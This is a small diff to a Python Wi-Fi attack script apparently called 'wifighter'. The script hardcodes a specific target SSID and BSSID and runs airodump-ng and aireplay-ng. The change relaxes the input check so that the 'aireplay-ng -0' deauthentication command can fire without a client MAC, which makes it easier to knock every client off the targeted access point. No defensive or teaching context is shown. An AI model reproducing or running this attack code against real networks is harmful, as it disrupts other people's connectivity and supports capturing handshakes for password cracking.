@@ -7,7 +7,7 @@ import psutil
 # Get the full path of wifighter dir
 wifighter_path = os.path.dirname(os.path.abspath(__file__))
 
-interface = "wlp101s0f3u1u1"
+interface = "wlp1s0"
 
 ssid = "Struhar_2.4GHz"
 bssid = "40:ed:00:17:e0:d8"
@@ -56,7 +56,7 @@ def run_airodump(interface, bssid, channel, output_dir):
 
 # Run aireplay-ng
 def run_aireplay(interface, bssid, client_mac, deauth_type):
-    if interface and bssid and client_mac and deauth_type:
+    if interface and bssid and deauth_type:
         if deauth_type == "client":
             if client_mac:
                 command = ['sudo', 'aireplay-ng', '-0', '1', '-a', bssid, '-c', client_mac, interface]
